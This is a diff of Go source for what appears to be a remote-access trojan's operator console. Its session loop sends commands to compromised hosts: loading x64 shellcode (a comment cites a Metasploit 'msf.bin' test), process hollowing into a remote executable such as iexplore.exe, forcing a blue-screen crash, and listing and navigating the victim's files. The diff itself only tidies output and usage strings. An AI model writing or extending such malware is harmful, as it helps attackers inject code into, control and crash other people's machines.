@@ -216,8 +216,9 @@ func openSession(id int, ll *SessionList) {
 				// 	playAudio(&current.Conn, audioFile)
 				// }
 				if loadMatch != "" {
-					binFile := strings.Split(command, " ")[1]
-					load(&current.Conn, binFile)
+					binFilePathLocal := strings.Split(command, " ")[1]
+					load(&current.Conn, binFilePathLocal)
+					fmt.Println()
 				}
 				if hollowMatch != "" {
 					filePathLocal := strings.Split(command, " ")[1]
@@ -236,31 +237,36 @@ func openSession(id int, ll *SessionList) {
 					ll.displaySessionInfo(current.id)
 				case "bsod": //Refine it a bit more
 					if bsod(&current.Conn) {
+						fmt.Println()
 						fmt.Println("[!]HOST BSOD !")
 						fmt.Println("[?]Impliment Feature where the session is removed from the list when this happens")
+						fmt.Println()
 						return
 					} else {
+						fmt.Println()
 						fmt.Println("[-]Couldn't BSOD the Host ...")
+						fmt.Println()
 					}
 				case "bg":
 					return
 				case "exit":
 					return
-				case "play": //The audio thing only works if the device is not a VM
-					fmt.Println("[?]Usage: play <fileNameInAudio>")
-					//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
+				// case "play": //The audio thing only works if the device is not a VM
+				// 	fmt.Println()
+				// 	fmt.Println("[?]Usage: play <fileNameInAudio>")
+				// 	fmt.Println()
+				//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
 				case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
-					fmt.Println("[?]Usage: play <x64ShellcodeFile>")
-					//load(&current.Conn, "msf.bin") //Test Case. Success
+					fmt.Println("\n[?]Usage: load <pathTox64Shellcode>\n")
 				case "cd":
-					fmt.Println("[?]Usage: cd <dir>") //Works with relative and absolute paths
+					fmt.Println("\n[?]Usage: cd <dir>\n") //Works with relative and absolute paths
 				case "ls":
 					ls(&current.Conn)
 				case "pwd":
 					pwd(&current.Conn)
 				case "hollow":
-					fmt.Println("[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
-					fmt.Println("[?]Windows paths should have double backslashes as such: \"C:\\Progarm Files\\Internet Explorer\\iexplore.exe\"")
+					fmt.Println("\n[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
+					fmt.Println("[?]Windows paths must have double backslashes as such: \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n")
 				default:
 				}
 			}
